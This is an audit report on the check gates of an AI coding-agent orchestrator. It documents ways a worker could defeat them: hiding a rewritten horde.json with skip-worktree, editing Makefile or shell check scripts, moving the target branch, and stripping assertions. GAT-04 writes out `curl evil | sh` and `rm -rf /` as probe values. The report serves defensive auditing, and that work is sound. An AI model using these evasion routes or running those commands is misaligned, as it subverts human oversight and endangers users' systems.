# Scope 2 — Gates that gate, invariant drift

Part of the 2026-10-28 audit. See [INDEX.md](INDEX.md) for the triage,
method, and caveats. Status legend: `[ ]` open / `[x]` closed
(record the closing commit SHA beside the checkbox).

## Scope summary

The audit fires for every documented category I constructed (deleted/moved/skipped/focused tests, early exits, every suppression and secret pattern, binaries, >1 MB files, merge commits, scope, package.json script and hook changes, horde.json verify changes, runner/tool configs, pyproject sections, committed-then-removed secrets), and the check runner behaves as claimed (CI=1, HORDE_*/OPENCODE_SERVER_*/NODE_TEST_CONTEXT stripped, HORDE_TASK only for tasks, process-group kill on timeout, dead lock holders freed, fast-forward refused on collisions). The invariant 'the work cannot rewrite its rules' does not hold at the land stage: fleet.ts landLoop calls gate() without base/rulesAt, so gate.ts:290 reads the worktree's on-disk horde.json; a worker can hide a rewritten horde.json with `git update-index --skip-worktree` (invisible to git diff, ls-files and therefore to every audit path, and to the rebase) and land a tree whose real `when: land` check fails, or do it openly in a repository that sets audit tests to warn. Check scripts outside package.json (Makefile targets, shell scripts a check runs) and the non-verify sections of horde.json (workers.land/setup) are not rule-guarded, the worker's shell can move the target branch (`git update-ref`, `git -C <repo> reset --hard`) so that its own horde.json becomes 'the rules at the tip', and a task started from a repository subdirectory is gated on different checks at land than during its rounds (none at all when the checks live only in the subdirectory). Smaller drift: assertion removal and snapshot rewrites only warn (the design lists them under the blocking tests category), the verdict cache ignores git-ignored inputs, a check that rewrites a tracked file makes later checks see a tree that is not the one that lands, support-fixes.test.ts (22 passing tests) is never run by npm test or ci.sh, and the bundle check is one-directional and trusts whatever node_modules holds.

## GAT-01 — Land-stage gate reads the worktree's on-disk horde.json, so a worker's rewritten checks judge what lands

- [x] closed in d8ff37a — **Executed evidence:** gate() honours rulesAt without a base and detectChecks reads manifests from that commit; landLoop passes the observed tip; tests 'gate honours rulesAt without a base' and 'for the detected checks too' in verify.test.ts and horde.test.ts (task t-1912's gate green; final ci run below)
- **Severity:** high **BLOCKING** · **Confidence:** high
- **Location:** `packages/verify/src/gate.ts:290`

**Evidence:** gate.ts:290 `const settings = base && opts.settingsFrom !== "working" ? await loadSettingsAt(dir, opts.rulesAt ?? base) : loadSettings(dir)`; fleet.ts:1692-1700 landLoop calls `runGate(wt.root, { audit: false, related: false, stage: "land", env, baseline, ... })` with no base and no rulesAt, so loadSettings(wt.root) reads the worktree file. Probe (scratchpad/audit/gates/gate-probes.mts section F, log gate-probes.log): main horde.json = {unit: "sh unit.sh", e2e: {command: "sh e2e.sh", when: "land"}}; worker commits app.txt=bad (only e2e.sh notices), work-stage gate as runGateFor calls it: `F1 pass=true ... e2e skipped: runs before landing (when: land)`; worker writes horde.json with e2e: "true" and runs `git update-index --skip-worktree horde.json` → `worktree git status after skip-worktree: ""`, `audit findings: (none)`; landSync rebased onto a moved master, after which `worktree HEAD:horde.json e2e = {command: sh e2e.sh, when: land}` but `on-disk horde.json e2e = "true"`; the land-stage gate exactly as landLoop calls it: `F2 pass=true  check e2e: cmd="true" pass=true`; `the real e2e.sh on the tree that would land: exit 1`; `would fast-forward: yes`. Variant without skip-worktree (F3): tip horde.json has audit.warn [tests]; worker commits horde.json e2e: "true" + app.txt=bad → work gate `pass=true` with only `warning: tests: horde.json changes the rules the gate checks with: horde.json verify`, land gate `check e2e: cmd="true" pass=true`. docs/DESIGN.md:337 claims these rules are read 'at the gate and at land, never from a worktree's copy'.

**Why it matters:** Landing is the only place the full suite and `when: land` checks run, and it is the one gate whose rules come from the worker's tree. 'Landing never breaks your branch' and 'the work cannot rewrite its rules' both fail here; rule-change findings are also filed under the `tests` category, so any repository that downgrades tests to warn loses the guard entirely.

**Fix sketch:** In landLoop pass `rulesAt: tip` (and in gate() honour rulesAt without base: `opts.rulesAt || (base && settingsFrom !== 'working') ? loadSettingsAt(dir, opts.rulesAt ?? base) : loadSettings(dir)`); have detectChecks read manifests from the commit (git show) when rulesAt is given; give rule changes their own always-blocking category instead of `tests`; and flag skip-worktree/assume-unchanged index entries (see next finding).

## GAT-02 — `git update-index --skip-worktree` hides any edit (horde.json, package.json, tests) from every audit path

- [x] closed in 7995364 — **Executed evidence:** packages/verify/src/audit.ts adds a blocking tests finding for skip-worktree and assume-unchanged entries of git ls-files -v and still audits their on-disk content; task t-99b7's per-hole test in verify.test.ts constructs the evasion; npm test -w @mcp-horde/verify → 103 pass; gate review 5 of 5 met
- **Severity:** high **BLOCKING** · **Confidence:** high
- **Location:** `packages/verify/src/audit.ts:271`

**Evidence:** audit.ts:271-339 changes() builds the change list from `git diff --name-status`, `git diff -U0` and `git ls-files --others --exclude-standard`; all three honour the skip-worktree bit. Probe audit-probes.mts case 34 (log audit-probes.log): horde.json rewritten to {checks: {test: "true"}} then `git update-index --skip-worktree horde.json` → `git status --porcelain: ""`, `on-disk horde.json test command: true`, audit → `(no findings)`. The same bit also survives landSync's rebase (gate-probes.log section F: HEAD:horde.json differs from the on-disk file after `rebased 1 commit(s)`). `grep -n "skip-worktree\|assume-unchanged\|ls-files -v" packages/*/src/*.ts` → no hits.

**Why it matters:** Every 'the audit is the backstop' argument (DESIGN.md:131 for shell writes, the rule-change guard, scope) assumes git reports the worktree truthfully; one index flag a shell can set makes a file invisible to the audit while every on-disk reader (loadSettings at land, detectChecks, the checks themselves) still sees it.

**Fix sketch:** In audit(), run `git ls-files -v -z` and add a blocking finding for every entry whose tag is `S` (skip-worktree) or lowercase (assume-unchanged), e.g. `tests: horde.json is hidden from git (skip-worktree)`; alternatively clear those bits (`git update-index --no-skip-worktree --really-refresh`) before diffing in a worktree the horde owns.

## GAT-03 — Check scripts outside package.json are not rule-guarded: Makefile targets and shell scripts a check runs can be rewritten freely

- [x] closed in 7995364 — **Executed evidence:** gate.ts passes the checks (name, command, cwd) into audit(), which treats scripts a check command names (Makefile/justfile/Taskfile targets, sh/python/node scripts and one level below) as rule files; tests for a Makefile check and a  check block (verify suite 103 pass)
- **Severity:** high **BLOCKING** · **Confidence:** high
- **Location:** `packages/verify/src/audit.ts:518`

**Evidence:** ruleChanges (audit.ts:518-594) watches horde.json verify, package.json scripts (+pre/post hooks), RUNNER_CONFIG, conftest.py, CHECK_CONFIG, pyproject/setup.cfg sections only. Probe audit-probes.mts case 35: repository whose only check is detected from `Makefile` (`test:\n\tsh run-tests.sh`), worker rewrites the target to `true` → `(no findings)`. Case 36: horde.json check `{"test": "sh run-tests.sh"}`, worker rewrites run-tests.sh from `exit 1` to `exit 0` → `(no findings)`. For contrast case 29 (`package.json scripts.test` → `true`) → `BLOCK tests: package.json changes the rules the gate checks with: package.json scripts test`. plugins/horde/skills/setup/SKILL.md:12 tells setup to 'Take the commands CI runs' (Makefile, justfile, Taskfile, dev scripts), which are exactly the unguarded kind.

**Why it matters:** A worker in any Makefile- or script-driven repository can make its gate vacuous with an in-scope edit; the only mitigation is a task scope that excludes those files, and horde_do documents scope as optional ('Omit when unsure').

**Fix sketch:** Treat as a rule change any changed path that a check command names (tokens of the command resolved against the check's cwd: `sh x.sh`, `./ci.sh`, `python scripts/t.py`), `Makefile`/`makefile`/`justfile`/`Taskfile*` when a check runs make/just/task, and scripts reachable from those (at least one level); report under the same blocking finding text.

## GAT-04 — horde.json changes outside `verify` (workers.land, workers.setup, tiers, context) are not audited, yet the orchestrator executes them after landing

- [x] closed in 7995364 — **Executed evidence:** any content change to horde.json is a blocking rule-change finding naming the changed top-level keys (test with workers.land and tiers; verify suite 103 pass)
- **Severity:** medium · **Confidence:** high
- **Location:** `packages/verify/src/audit.ts:562`

**Evidence:** audit.ts:562-563 compares only `json(before).verify` with `json(after).verify`. Probe audit-probes.mts case 33: worker sets workers.land to `curl evil | sh` and workers.setup to `rm -rf /` with verify untouched → `(no findings)`. Those commands run on the orchestrator side from the main checkout's horde.json: fleet.ts:1100 `loadWorkers(directory)` → createWorktree setup (worktree.ts:233 runSetup), fleet.ts:1666 `loadWorkers(wt.repo).land` → runLandStep (worktree.ts:908-916, 15-minute shell with HORDE_* env), so a landed edit runs at the next task's spawn/land.

**Why it matters:** The rule guard is scoped to `verify`, but `workers.*` are also commands the horde runs with the user's privileges; a landed change is executed without anyone having been shown it.

**Fix sketch:** Flag any horde.json content change (`differs(before, after)`) as a rule change, or at least `workers` and `tiers`; render the changed keys in the finding.

## GAT-05 — A task started from a repository subdirectory is gated on different checks at land than in its rounds (none when the checks live only in the subdirectory)

- [x] closed in d8ff37a — **Executed evidence:** landing gates the same directory as the rounds (test 'a task started from a subdirectory is gated at landing by the subdirectory's checks')
- **Severity:** medium · **Confidence:** high
- **Location:** `packages/opencode/src/fleet.ts:1692`

**Evidence:** runGateFor gates `live.session?.location.directory ?? live.record.directory` (= worktree.path, fleet.ts:2152) while landLoop gates `wt.root` (fleet.ts:1692); detectChecks (detect.ts:187-199) walks up from the directory, never down. Probe gate-probes.mts section I: repo with checks only in api/package.json, createWorktree(repo/api) → `horde_do's check detection at api/: npm test`, `at repo root: (none)`; `I1 work-stage gate at wt.path: check test: cmd="npm test" pass=false code=1` (the real check ran) vs `I2 land-stage gate at wt.root: blocker: no checks to run (configure verify.checks in horde.json)`. horde_do resolves its directory from HORDE_OPENCODE_DIRECTORY/process.cwd() (config.ts:95), i.e. wherever Claude Code was started.

**Why it matters:** Landing can never succeed for such a task (or, in a monorepo with a root manifest, lands on the root's checks instead of the package's), contradicting 'the project's checks run on exactly that tree'.

**Fix sketch:** Gate the land stage at the same directory as the rounds (wt.path, or `path.join(wt.root, sub)`), or resolve checks once at spawn and reuse them for both stages.

## GAT-06 — Assertion removal and snapshot rewrites only warn (never block), and a snapshot rewrite of 20 lines or fewer is silent

- [x] closed in 7995364 — **Executed evidence:** a test file losing all or more than half of its assertions, and a snapshot mostly replaced, now block; smaller losses warn; docs/DESIGN.md §4.3 updated (verify suite 103 pass)
- **Severity:** medium · **Confidence:** high
- **Location:** `packages/verify/src/audit.ts:674`

**Evidence:** audit.ts:674 `add("tests", {... removes N assertions}, true)` and :675-676 snapshot `... c.removed.length > 20 ... , true)`: the `soft` flag forces severity warn whatever the category's setting (audit.ts:628). Probe audit-probes.mts case 7 (all three asserts removed, tests kept): `WARN tests: test/a.test.js removes 3 assertions`; case 9 (30-line snapshot rewritten): `WARN tests: ... rewrites a snapshot (30 lines removed)`; case 10 (20 of 30 lines changed): `(no findings)`. docs/DESIGN.md:165 lists 'assertions removed' and 'snapshot files rewritten wholesale' under `tests`, and :169 says tests block by default.

**Why it matters:** A test emptied of its assertions still 'passes'; the gate passes with a warning the worker is never asked to fix, so the documented default (tests block) is weaker than stated for the two cheapest ways to neuter a test.

**Fix sketch:** Block when a test file loses all of its assertions (or more than half), keep a warning for partial loss; lower the snapshot threshold or compare the share of removed lines; document the soft cases.

## GAT-07 — Verdict cache ignores git-ignored inputs: a changed .env or linked dependency leaves a cached PASS

- [x] closed in 494e12d — **Executed evidence:** gate.ts: passing verdicts expire after ten minutes and the key covers size+mtime of top-level ignored files outside dependency directories; the verdict names what the key does not cover; tests in verify.test.ts (98 pass at the time, 103 now); task t-2b31's gate review 4 of 4 met
- **Severity:** medium · **Confidence:** high
- **Location:** `packages/verify/src/gate.ts:86`

**Evidence:** treeKey (gate.ts:81-95) hashes HEAD, `git diff --binary HEAD` and `ls-files --others --exclude-standard` (ignored files excluded) plus the options. Probe gate-probes2.mts 'B4' (log gate-probes2.log): check `grep -q good .env` with `.env` in .gitignore → `first run (.env=good): pass=true cached=false`; after writing .env=bad → `pass=true cached=true`; `same with fresh: true: pass=false ... blocker: test: exit 1`. The comment at gate.ts:77-78 says the key 'changes whenever anything a check could see changes'; DESIGN.md:177 makes the same claim.

**Why it matters:** Within one server process, a passing verdict survives changes to anything git ignores (environment files, a linked node_modules after an install), so a re-check after such a change reports 'cached: tree unchanged'.

**Fix sketch:** Add a TTL to cache entries, and/or include size+mtime of ignored files outside linked directories (bounded), or say in the verdict that ignored files are not part of the key.

## GAT-08 — A check that rewrites a tracked file makes later checks judge a tree that is not the one that lands

- [x] closed in d8ff37a — **Executed evidence:** a check that modified tracked files refuses the fast-forward naming them (test 'a check that rewrites a tracked file refuses the fast-forward, naming it')
- **Severity:** low · **Confidence:** high
- **Location:** `packages/opencode/src/fleet.ts:1713`

**Evidence:** landLoop fast-forwards `judged` (the commit before the checks ran, fleet.ts:1713) while checks run sequentially in the working tree (run.ts:71-74). Probe gate-probes.mts section J: checks {gen: `echo generated > data.txt`, test: `grep -q generated data.txt`} with committed data.txt='stale' → `J1 land-stage gate: pass=true`; `committed data.txt (what git merge --ff-only lands): "stale"; working data.txt after checks: "generated"; git status: "M data.txt"`; `the test check on the committed tree: FAIL`.

**Why it matters:** The claim 'the checks run on exactly the tree that lands' holds for untracked outputs (never committed) but not for a check that regenerates committed files; the landed tree was never tested in that state.

**Fix sketch:** After the land gate, refuse to fast-forward when `git status --porcelain` in the worktree shows modified tracked files (name them and point at workers.land), or reset tracked files between checks.

## GAT-09 — Untracked artefacts of the worker's own test runs (e.g. __pycache__ in a repo whose .gitignore lacks it) block the gate as binaries

- [x] closed in 494e12d — **Executed evidence:** known runner caches present before the gate are treated as check output and a blocking finding on such a path hints at .gitignore (test with an untracked __pycache__)
- **Severity:** low · **Confidence:** high
- **Location:** `packages/verify/src/gate.ts:326`

**Evidence:** gate.ts:324-326 drops only files that first appear during the gate's own run. Probe gate-probes.mts section A (pytest project without .gitignore): the first gate's pytest run left __pycache__; every later gate: `blocker: binaries: __pycache__/a.cpython-313.pyc adds or changes a binary file` (4 such blockers), and the related plan counted them as changed files: `full: "5 changed file(s) without related tests (b.py, __pycache__/a.cpython-313.pyc, ...)"`.

**Why it matters:** A worker that runs the tests before the gate (as the brief tells it to) is blocked by its runner's cache files in repositories with an incomplete .gitignore; the verdict blames binaries, not the missing ignore rule.

**Fix sketch:** Treat well-known runner caches (__pycache__, .pytest_cache, .mypy_cache, coverage files, .ruff_cache) as check output regardless of when they appeared, or hint at .gitignore in the finding.

## GAT-10 — Checks inherit provider API keys; only OPENCODE_SERVER_* and HORDE_* are stripped

- [x] closed in 494e12d — **Executed evidence:** run.ts strips *_API_KEY, *_TOKEN, *_SECRET, *_PASSWORD and the listed provider keys from check environments unless the check's env sets them; HORDE_TASK and HORDE_WORKTREE still reach task checks (tests)
- **Severity:** low · **Confidence:** high
- **Location:** `packages/verify/src/run.ts:54`

**Evidence:** run.ts:54 `STRIP_ENV = ["FORCE_COLOR", "CLICOLOR_FORCE", "NODE_TEST_CONTEXT", "OPENCODE_SERVER_", "HORDE_"]`. Probe gate-probes.mts section C (check = `env | grep ...`): with DEEPSEEK_API_KEY/ANTHROPIC_API_KEY set in the gate's process, the check's environment printed `ANTHROPIC_API_KEY=ak`, `DEEPSEEK_API_KEY=dsk` alongside `CI=1`, `NO_COLOR=1`, `TERM=dumb`, while HORDE_PROBE_SECRET, OPENCODE_SERVER_PASSWORD, NODE_TEST_CONTEXT and FORCE_COLOR were absent.

**Why it matters:** A worker-authored test runs with the orchestrator's provider credentials; DESIGN.md:8 only promises the two prefixes, so this is a documentation-accurate but easily tightened boundary.

**Fix sketch:** Strip `*_API_KEY`, `*_TOKEN`, `*_SECRET` and the known provider variables from check environments unless a check's `env` names them.

## GAT-11 — horde.json workers.land/setup are read from the main checkout's working file, not from the branch tip

- [x] closed in d8ff37a — **Executed evidence:** workers.land and workers.setup are read at the observed tip (test 'landing runs the committed workers.land, not an uncommitted edit in the checkout')
- **Severity:** low · **Confidence:** high
- **Location:** `packages/opencode/src/fleet.ts:1666`

**Evidence:** fleet.ts:1666 `const land = loadWorkers(wt.repo).land` and :1100 `loadWorkers(directory)` → core config.ts:203 loadWorkers → loadHordeFile reads the file on disk; worktree.ts:893-894 does the same in landSync. DESIGN.md:337: 'an uncommitted horde.json changes nothing'.

**Why it matters:** Harmless for rules (it is the user's own file) but inconsistent with the documented invariant; combined with the unaudited `workers` section (above) it is also where a landed command takes effect.

**Fix sketch:** Read `workers` at the branch tip like verify settings (loadSettingsAt-style), or document that workers.* is the checkout's working file.

## GAT-12 — DESIGN lists a git finding for commits touching only .horde/.opencode that is not implemented

- [ ] *(open)*
- **Severity:** info · **Confidence:** high
- **Location:** `docs/DESIGN.md:170`

**Evidence:** DESIGN.md:170 'git: merge commits on the branch, commits that touch only .horde/.opencode'; `grep -rn "\.opencode\|\.horde" packages/verify/src/audit.ts` → no hits; audit.ts:732-735 implements only the merge-commit finding (probe case 25: `WARN git: 1 merge commit on the branch`).

**Why it matters:** Documentation drift; no gate depends on it.

## GAT-13 — Verified: test tampering detections fire (deleted/moved/skipped/focused tests, early exits, test definitions removed)

- [ ] *(open)*
- **Severity:** info · **Confidence:** high
- **Location:** `packages/verify/src/audit.ts:650`

**Evidence:** audit-probes.mts cases 1-6, 8, 11: `BLOCK tests: test/a.test.js deletes a test file`; `moves a test file out of the test suite (to test/a.test.js.bak)`; it.skip/describe.only/xit/test.todo → 4 BLOCK lines (`skips a test`, `focuses tests with .only`); node:test `{ skip: true }` → BLOCK; `@pytest.mark.skip` and `pytest.skip()` → BLOCK ×2; go `t.Skip` and rust `#[ignore]` → BLOCK; `process.exit(0)` in a test → `exits the test process early`; one `it(` removed → `removes 1 test`.

**Why it matters:** Verified-clean record.

## GAT-14 — Verified: suppressions, dependencies, secrets (including committed-then-removed), binaries, size, generated exemption, merge commits, scope

- [ ] *(open)*
- **Severity:** info · **Confidence:** high
- **Location:** `packages/verify/src/audit.ts:678`

**Evidence:** audit-probes.mts: case 12 → 16 WARN suppressions (@ts-ignore, @ts-nocheck, bare @ts-expect-error, eslint-disable, biome-ignore, as any, as unknown as, catch {}, catch (e) { }, .catch(() => {}), .catch(() => undefined), # type: ignore, # noqa, except: pass, #![allow(, #[allow(, // nolint; reasoned @ts-expect-error not flagged); cases 13-19 → WARN dependencies for package.json (adds lodash@^4, vitest@1; changes left 1.0.0 → 2.0.0), requirements.txt, pyproject [project] and [tool.poetry.dependencies], go.mod, Cargo.toml, lockfile; case 20 → BLOCK secrets for AWS key, private key, GitHub token, Slack token, sk-proj, sk-ant, Google key, hard-coded credential (process.env/${} placeholders not flagged); audit-history.mts (base before the leak) → `block secrets: src/s.js:1 adds what looks like an AWS access key in commit 10b1935`; case 22 → BLOCK binaries for an untracked PNG and a tracked .bin; case 23 → `big.txt file is 1.0 MB`; case 24 (dist/** generated) → no findings; case 25 → `WARN git: 1 merge commit on the branch`; cases 26-28 → BLOCK scope for a tracked edit, an untracked file written outside scope, and a task scope narrowing horde.json's allowed.

**Why it matters:** Verified-clean record; note that merge commits and dependencies warn by default as documented.

## GAT-15 — Verified: rule-change guard fires for package.json scripts/hooks, horde.json verify (checks and audit), runner/tool configs, conftest.py, pyproject [tool.pytest]

- [ ] *(open)*
- **Severity:** info · **Confidence:** high
- **Location:** `packages/verify/src/audit.ts:720`

**Evidence:** audit-probes.mts cases 29-32, 37-38: `BLOCK tests: package.json changes the rules the gate checks with: package.json scripts test`; `... scripts pretest` (hook added); `horde.json changes the rules the gate checks with: horde.json verify` for a checks change and for `audit.off: [tests, scope]`; `.mocharc.yml`, `conftest.py` (+ `collect_ignore_glob` as a skip), `jest.config.js`, `tsconfig.json`; `pyproject.toml [tool.pytest]`.

**Why it matters:** Verified-clean record (see the Makefile/shell-script and skip-worktree findings for what it misses).

## GAT-16 — Verified: related-tests narrowing falls back to the full suite for untested sources, test helpers and config files

- [ ] *(open)*
- **Severity:** info · **Confidence:** high
- **Location:** `packages/verify/src/related.ts:194`

**Evidence:** gate-probes.mts section A (pytest project): A1 a.py (covered) → `cmd="python3 -m pytest -q tests/test_a.py" related={command..., tests: [tests/test_a.py]}`; A2 b.py (no test) → `cmd="python3 -m pytest -q" related={tests: [], full: "... changed file(s) without related tests (b.py, ...)"}` plus `warning: tests: no test covers 1 changed source file(s): b.py`; A3 tests/helper.py → full with `tests/helper.py` named; A4 config.yaml → full with `config.yaml` named.

**Why it matters:** Verified-clean record.

## GAT-17 — Verified: verdict cache invalidates on allowed scope and on a working-tree horde.json command change; failing verdicts are not cached

- [ ] *(open)*
- **Severity:** info · **Confidence:** high
- **Location:** `packages/verify/src/gate.ts:296`

**Evidence:** gate-probes.mts section B: `B1 second run, same tree: cached=true`; `B2 same tree, different allowed: cached=false` then cached again with the same allowed; `B3 settingsFrom working after editing the working horde.json command: cached=false` with `cmd="sh check.sh; echo changed"`; gate.ts:388 caches only `verdict.pass`. (Ignored inputs are the exception, reported separately.)

**Why it matters:** Verified-clean record.

## GAT-18 — Verified: check environment (CI=1, stripped prefixes, HORDE_TASK/HORDE_WORKTREE only for tasks) and process-group kill on timeout

- [ ] *(open)*
- **Severity:** info · **Confidence:** high
- **Location:** `packages/verify/src/run.ts:48`

**Evidence:** gate-probes.mts section C: C1 printed `CI=1 NO_COLOR=1 TERM=dumb` and no HORDE_*/OPENCODE_SERVER_*/NODE_TEST_CONTEXT/FORCE_COLOR although all were set in the parent; C2 with opts.env added exactly `HORDE_TASK=t-1 HORDE_WORKTREE=/wt` (fleet.ts:2163 passes env only `wt ? {...} : undefined`; baseline runs set HORDE_TASK=base-<sha>, gate.ts:198). timeout-probe.mts: check `sleep 299 & sleep 299 & (sleep 299 &) ; sh -c 'sleep 299' & wait` with timeoutSeconds 2 → `verdict pass=false stopped=timeout after 2022ms; blocker: test: timed out`, `sleep 299 alive after the timeout: 0`. Known limit (run.ts:171-172 comment) confirmed: `setsid sleep 301 & wait` → the sleep survived the timeout (gate-probes2.log D2) and had to be killed by the probe.

**Why it matters:** Verified-clean record; the setsid escape is documented in code and inherent to process-group kills.

## GAT-19 — Verified: slot locks are cross-process files; a dead holder is freed at once, a stale heartbeat (>30 s) is taken over, a live holder (or another host) is respected until the check timeout

- [ ] *(open)*
- **Severity:** info · **Confidence:** high
- **Location:** `packages/core/src/files.ts:100`

**Evidence:** files.ts:100-101 `dead = holder.host === SELF.host && !pidAlive(holder.pid)`, `if (dead || age > 30_000)`; heartbeat utimes every 5 s (:117-124). gate-probes.mts section E with check {command: true, slots: 1}, timeoutSeconds 3, lock file `check-test.0.lock` under lockDirFor(): `E1 lock held by dead pid 999999 (fresh mtime): pass=true in 18ms; lock file left: false`; `E2 lock held by live pid <sleep> (fresh mtime): pass=false in 3822ms; test: failed to run`; `E3 lock held by live pid, mtime 40s old: pass=true in 17ms`; `E4 lock held by another host, fresh mtime: pass=false in 3817ms`.

**Why it matters:** Verified-clean record; a hung-but-alive holder on the same host is only taken over once its heartbeat stops (30 s), which is the documented design.

## GAT-20 — Verified: root horde.json (tracked edit or untracked file) is never carried into a worktree; a nested api/horde.json is carried but rules still come from git

- [ ] *(open)*
- **Severity:** info · **Confidence:** high
- **Location:** `packages/opencode/src/worktree.ts:334`

**Evidence:** gate-probes.mts section H: checkout horde.json edited to test: "false" → worktree `horde.json test = true` with note `horde.json's uncommitted changes stay in your checkout; tasks use HEAD's`; untracked horde.json → `in worktree? false`; nested `api/horde.json` edit → carried into the baseline commit (`baseline commit files: api/horde.json, api/x.txt`), while loadSettingsAt reads `git show <commit>:api/horde.json` (detect.ts:78) so the task's rules are unaffected.

**Why it matters:** Verified-clean record with one documented-vs-actual nuance (only the root file is excluded: worktree.ts:337 `pipePatch(repo, root, ["horde.json"])`, :350 `rel === "horde.json"`).

## GAT-21 — Verified: fast-forward is refused on a colliding uncommitted change, keeps non-colliding ones, and re-checks the tip under a per-repository lock

- [ ] *(open)*
- **Severity:** info · **Confidence:** high
- **Location:** `packages/opencode/src/fleet.ts:1711`

**Evidence:** fleet.ts:1708-1715 `withLock(lockDir, "land", ... if (rev-parse HEAD !== tip) return false; git merge --ff-only judged)` with lockDir from lockDirFor (common git dir, shared by worktrees and processes using the same state dir), and :1734-1737 retries up to 3 times when the tip moved. gate-probes.mts section K: `K1 colliding uncommitted change: error: Your local changes to the following files would be overwritten by merge: a.txt ...; HEAD moved? false`; `K2 non-colliding uncommitted change: Updating ...; HEAD moved? true; b.txt kept? user's uncommitted b`. `git push . HEAD:master` from a worktree is refused by git (`branch is currently checked out`).

**Why it matters:** Verified-clean record.

## GAT-22 — Verified: ci.sh propagates every failure; npm --workspaces continues past a failing package and exits 1; pretest runs the hook tests; tests are typechecked and linted

- [ ] *(open)*
- **Severity:** info · **Confidence:** high
- **Location:** `ci.sh:10`

**Evidence:** ci.sh:10 `set -euo pipefail`, no pipelines in the script. Fixture scratchpad/audit/gates/npmws (three workspaces, b fails): output `A-ok`, `B-fails`, `npm error code 1`, `C-ran`, `npm test exit status: 1`. `node --test plugins/horde/hooks/*.test.mjs` → `# tests 28 / # pass 28` (delegate.test.mjs, news.test.mjs). packages/*/tsconfig.test.json `include: ["src", "test"]`; biome.json files.includes excludes only dist, node_modules, package-lock.json, plugins/horde/servers, evals/mocks/opencode/_tools.json, evals/results. eval-tools.mjs --check starts the committed bundle and compares the six horde_* tool definitions byte-for-byte with _tools.json.

**Why it matters:** Verified-clean record.
